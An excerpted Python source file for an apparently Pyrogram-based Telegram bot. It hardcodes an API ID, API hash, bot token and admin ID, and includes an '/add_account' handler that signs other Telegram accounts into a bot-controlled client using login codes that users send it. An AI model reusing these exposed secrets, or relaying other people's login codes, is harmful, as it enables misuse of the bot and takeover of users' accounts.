...
api_id = 22026408
api_hash = 'aa9672607abc0b8ae7efc49c551178a0'
token = '6832216994:AAFsL0alMWZR5HmNgUIqjAccy9MVS5xO3r0'
admin = [6824067223]
bot = Client('meshad', bot_token=token, api_id=api_id, api_hash=api_hash)
database = {}
temp_client = {}
...
async def returnMessage(_, message: Message):
  ...
  if text == "/add_account":
    ...
    try:
      ...
      m = await temp_client['client'](methods.authorisations.SignIn(phone_code=text, phone_number=temp_client['phone_number'], phone_code_hash=temp_client['response'].phone_code_hash, public_key=public_key))
      if m.status == "OK":
